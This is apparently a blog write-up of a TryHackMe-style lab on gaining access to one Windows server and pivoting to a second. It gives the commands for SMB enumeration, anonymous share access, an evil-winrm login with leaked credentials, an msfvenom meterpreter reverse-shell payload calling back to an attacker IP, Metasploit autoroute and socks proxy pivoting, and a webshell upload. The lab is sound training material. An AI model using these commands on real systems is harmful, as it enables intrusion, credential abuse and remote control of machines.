---
title: Powershell for pentesters
description: This lab focuses on leveraging PowerShell to gain initial access to a machine. You will then establish remote access and exploit a second machine that is not directly accessible from Kali. By identifying misconfigurations, extracting sensitive credentials, and obtaining a remote shell, you will demonstrate your ability to move through a multi-stage attack scenario.
author: xFraylin
date: 2025-08-21 00:42:00 +0800
categories: [Tryhackme]
tags: [CTF]
image:
  path: https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/logoo.png?raw=true
---

## Let's do a scan firts

![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/1nmap.png?raw=true)

>
```bash 
nmap -sCV serve.prod.local
```
1. sC active  default nmap scripts
2. -sV  detect service versions
{: .prompt-tip }
>
We perform a basic nmap script,version. As you can see have smb available
{: .prompt-info }

#Well once we know that there is an smb service running let's try to check if have public files, in my case when I tried with ```smbmap it doesn't work, then i did with smbclient```
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/2smbcl.png?raw=true)

>
```bash
smbclient -L //server.prod.local/
```
1. -L list all available shares
{: .prompt-tip}
>
So i Used this to enumare the share's files, As you can see there is ```11``` files available, We can use smbmap and the correct file to get acess
{: .prompt-info }

![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/3smbs.png?raw=true)
>
```bash
smbclient //server.prod.local/Utilities -U ""
```
1. -U "" Try to log with an empty cred (anynymous acess
{: .prompt-info }
>
We attemtp an anonymous loging using the current comand to check is the SMB share is accesible without valid creds, ( files that are on the current folder you can download typing   ```"get" following the file``` dont fortget that the first flag is here.
{: .prompt-tip}

![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/4getcred.png?raw=true)
Once we downloaded the files, Firts read de flag1 and the misconfiguration file, that exposed credentials

![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/evil-winrm.png?raw=true)
  Well with those credentials we can try to log in with ```evil-winrm``` with the following command
```bash
evil-winrm -i server.prod.local -u jack -p password
```
>
1. -i to specify    the host
2. -u the username
3. -p the password
{: .prompt-info}

![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/flag2.png?raw=true)

You can find the flag in the C:\ Directory

>
LETS GENERATE A WINDOWS PAYLOAD TO GET A METERPRETER SESSION
{: .prompt-tip}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.40.3 LPORT=4447 -f exe > payload.exe
-p speciy the os system
LHOST= the attacker ip (listener)
LPORT= the attacker port
-f the extension 
>  =    the name of the payload
```
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/msfvenom.png?raw=true)

Now go  to ```msfconsole and start the multi/handler```
```bash
msfcosole
use multi/handler
set PAYLOAD  windows/x64/meterpreter/reverse_tcp
set LHOST=10.10.40.3
set LPORT=4447
run
```
We utilize the same options here when we generate the payload, you have to put the same.
>
you have to knwo  that   we have a session open on evil-winrm, with winrm we can upload our payload with the command ```upload payload.exe```
an we got se meterpreter session
{: .prompt-info}
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/multi_handler.png?raw=true)

Once que have the meterpreter session opened, we can search for the post exploit module, the autorute
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/auto_proxy.png?raw=true)
```bash
use post/multi/manager/autoroute 
set session 1
run
```
once the autoroute its complete we can set up socks proxy, in this case ``socks_proxy``

```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
run
```
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/socks_config.png?raw=true)

>
WELL, I FORGOT AT THE BEGINNING SAY TO YOU, THAT THERE IS TWO SERVER THERE IS ONE UNRACHEABLE, web.ine.local AND THE ANOTHER server.prod.local


`web.prod.local` unreachable

`server.prod.local` reachable
{: .prompt-info}

Once the socks_proxy module is running we can try accessing to the unrechable server with proxychains,
```bash
proxychains firefox web.pro.local

= proxychains its a proxy tool that allow us to interact with the socks_proxy running on the metasploit session
```

![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/acess%20to%20the%20web.png?raw=true)
Now that we know that we have access to that network we can perform a scan.

Let's use the portscan module to scan the target
in this case we are going to use portscan/tcp

```bash
msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS web.prod.local
set PORTS 1-500
run
```
There is 4 open ports, let's explore the smb port
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/smbopen.png?raw=true)

We can list all the shares with the following command
```bash
proxychains smbclient -L //web.prod.local/

proxychains = the socks proxy tool
-L = List all the shares available
```
There is 4 Shares, but there is one intersting `wwwroot` let's try to access to that share
![Desktop View](https://raw.githubusercontent.com/xFraylin/xfraylin.github.io/refs/heads/main/assets/Powershell/filesavasmbproxy.png)

Well right here there if the flag number 3
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/flag3.png?raw=true)

>
You can upload a webshell o whatever you want to get access to the target, on my case i'll upload a webshell, that its available in `/usr/share/webshells/` you can find whathever you want.
{: .prompt-info}
![Desktop view](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/uploadtheshell.png?raw=true) 

`I uploaded the cmdasp.aspx to get a RCE on the web `

`You can find the flag4 on the C:\ Dir`
![Desktop view](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/Powershell/flag4.png?raw=true)

>
We perform a enumeration scan, generate payload to inject the target, and we did pivoting.
{: .prompt-tip}